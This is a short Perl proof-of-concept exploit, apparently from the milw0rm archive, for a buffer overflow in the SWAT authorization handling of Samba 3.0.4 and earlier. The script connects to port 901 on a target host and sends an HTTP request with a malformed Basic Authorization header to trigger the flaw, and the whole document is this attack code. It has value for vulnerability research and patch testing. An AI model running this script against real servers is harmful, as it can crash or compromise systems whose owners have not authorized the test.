#!/usr/bin/perl
# Samba 3.0.4 and prior's SWAT Authorization Buffer Overflow
# Created by Noam Rathaus of Beyond Security Ltd.
#

use IO::Socket;
use strict;

my $host = $ARGV[0];

my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, 
PeerPort => "901" );

unless ($remote) { die "cannot connect to http daemon on $host" }

print "connected\n";

$remote->autoflush(1);

my $http = "GET / HTTP/1.1\r
Host: $host:901\r
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20040712 
Firefox/0.9.1\r
Accept: text/xml\r
Accept-Language: en-us,en;q=0.5\r
Accept-Encoding: gzip,deflate\r
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r
Keep-Alive: 300\r
Connection: keep-alive\r
Authorization: Basic =\r
\r
";

print "HTTP: [$http]\n";
print $remote $http;
sleep(1);
print "Sent\n";

while (<$remote>)
{
 print $_;
}
print "\n";

close $remote;

# milw0rm.com [2004-07-22]
